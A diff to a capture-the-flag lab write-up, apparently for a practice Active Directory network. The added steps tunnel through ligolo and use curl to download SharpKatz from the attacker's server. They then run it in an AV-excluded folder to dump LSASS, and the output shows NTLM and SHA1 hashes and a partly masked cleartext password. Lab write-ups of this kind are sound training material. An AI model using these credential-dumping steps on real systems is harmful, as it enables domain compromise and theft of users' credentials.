@@ -1456,7 +1456,7 @@ Then we can proceed to connect to the server with RDP, using Remmina. Then I set
 ### Flag submission 
 You can find the flag in the administrator desktop folder.
 
-Now that we compromised a domain machine we can try to get in control of the DC. To do that we need to get at firs the credentials of the domain users. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password, in case of NTLM). But as we known probably credentials guard is in place, since we are on Server 2019. We can verify using the following command in powershell (run as administrator):
+Now that we compromised a domain machine we can try to get in control of the DC. To do that we need to get at first the credentials of the domain users. The first choice would be to try to dump LSASS to try to get some hashed password (or if we are lucky enough even clear password, in case of NTLM). But as we known probably credentials guard is in place, since we are on Server 2019. We can verify using the following command in powershell (run as administrator):
 
     Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
     ...
@@ -1468,10 +1468,42 @@ Since both 0 are returned for the settings showed above, it means that credentia
      whoami /priv | findstr SeDebug
         SeDebugPrivilege                          Debug programs                                                     Enabled
 
+At this point I decided to use the port of Mimikatz in C# [SharpKatz](https://github.com/b4rtik/SharpKatz), since it can be compiled by your own and eventually you can modify the source code to evade AV. Eventually I'm more confident with C#. For this Lab it was enough run the compiled file from the excluded folder. Defender did not complain. To download the file from our attacker machine we need to set up another listener in ligolo to access our python webserver throught the agent. Follows the command to execute in liglolo console:
 
+    [Agent : root@ip-10-200-95-33] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
 
+Then from S-SRV01 we can proceed to download the file:
 
+    C:\Users\support\Music>curl -O http://10.200.95.33:8000/SharpKatz.exe
+
+Then we can try to get lsass contents (run the command from an administrator CMD)
+
+    C:\Users\support\Music>SharpKatz.exe --Command logonpasswords > lsass.txt
+You will get the output in the lsass.txt too.
+
+Inspecting the file content we can find a clear password for a domain user:
+
+    ...
+    [*]	  Domain   : HOLOLIVE
+    [*]	  Username : watamet
+    [*]	  LM       : 00000000000000000000000000000000
+    [*]	  NTLM     : d8d41e6cf762a8c77776a1843d4141c9
+    [*]	  SHA1     : 7701207008976fdd6c6be9991574e2480853312d
+    [*]	  DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
+    [*]
     
+    [*]	 WDigest
+    [*]	  Hostname : HOLOLIVE  
+    [*]	  Username : watamet  
+    [*]	  Password : [NULL]
+    
+    [*]	 Kerberos
+    [*]	  Domain   : HOLO.LIVE  
+    [*]	  Username : watamet  
+    [*]	  Password : Nxxxxxxxxxxx! 
+    ,,,
+    
+[//]: # (Nothingtoworry!)
 
 
 
